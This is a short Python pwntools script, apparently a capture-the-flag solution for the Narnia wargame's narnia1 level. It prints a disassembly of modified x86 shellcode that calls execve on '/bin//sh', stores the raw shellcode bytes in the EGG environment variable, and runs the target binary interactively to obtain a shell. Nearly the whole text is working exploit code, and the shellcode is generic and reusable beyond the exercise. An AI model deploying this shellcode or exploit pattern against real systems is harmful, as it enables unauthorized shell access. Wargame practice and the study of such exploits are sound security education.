from pwn import *

print("Modyfied shellcode:\n")
print("""
 0:  83 ec 10                sub    esp,0x10
3:  31 c0                   xor    eax,eax
5:  50                      push   eax
6:  68 2f 2f 73 68          push   0x68732f2f
b:  68 2f 62 69 6e          push   0x6e69622f
10: 89 e3                   mov    ebx,esp
12: 31 c9                   xor    ecx,ecx
14: 31 d2                   xor    edx,edx
16: 31 f6                   xor    esi,esi
18: 31 ff                   xor    edi,edi
1a: 31 ed                   xor    ebp,ebp
1c: b0 0b                   mov    al,0xb
1e: cd 80                   int    0x80
""")
env = {"EGG" : 
"\x83\xEC\x10\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\x31\xF6\x31\xFF\x31\xED\xB0\x0B\xCD\x80"}

p = process(executable="/narnia/narnia1", argv=[], env=env)
p.interactive()
